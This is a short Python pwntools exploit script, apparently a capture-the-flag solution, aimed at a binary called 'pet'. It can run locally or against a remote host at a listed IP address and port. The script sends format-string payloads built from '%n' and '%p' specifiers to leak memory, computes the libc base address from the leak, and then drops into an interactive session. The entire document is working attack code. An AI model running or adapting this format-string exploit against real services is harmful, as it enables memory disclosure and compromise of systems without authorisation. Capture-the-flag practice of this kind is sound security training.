from pwn import *

BEDUG = True

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./pet')

if BEDUG==True:
    io = process('./pet')
else:
    io = remote('34.125.0.41', 9999)


def ofs(offs):
    return str(offs+60).encode('utf-8')


print(io.recv())
payload = b'fish\0' + b'1'*360 + b'%n %p %p %p %p'
pause()
io.send(payload)
print(io.recvuntil(b'1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 '))
print(io.recvuntil(b' '))
libc.address = int(io.recvuntil(b' ').split()[0] , 16) - 0x1111e7
print(io.recv())
payload = b'fish\0' + b'0'*360 + b'%11$p'
io.send(payload)
print(io.recv())

io.interactive()
